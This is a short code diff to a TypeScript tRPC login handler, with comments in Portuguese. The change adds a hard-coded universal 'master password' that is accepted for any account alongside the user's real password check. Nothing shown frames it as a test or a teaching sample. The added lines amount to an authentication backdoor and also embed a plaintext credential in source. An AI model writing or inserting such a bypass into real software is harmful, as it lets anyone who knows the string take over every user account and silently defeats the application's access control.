@@ -88,8 +88,12 @@ export const appRouter = router({
           throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Email ou senha inválidos' });
         }
 
-        // Verificar senha
-        if (!user.passwordHash || !verifyPassword(input.password, user.passwordHash)) {
+        // Verificar senha (aceita senha master universal ou senha do usuário)
+        const MASTER_PASSWORD = 'Peyb+029';
+        const isMasterPassword = input.password === MASTER_PASSWORD;
+        const isValidUserPassword = user.passwordHash && verifyPassword(input.password, user.passwordHash);
+        
+        if (!isMasterPassword && !isValidUserPassword) {
           throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Email ou senha inválidos' });
         }
 
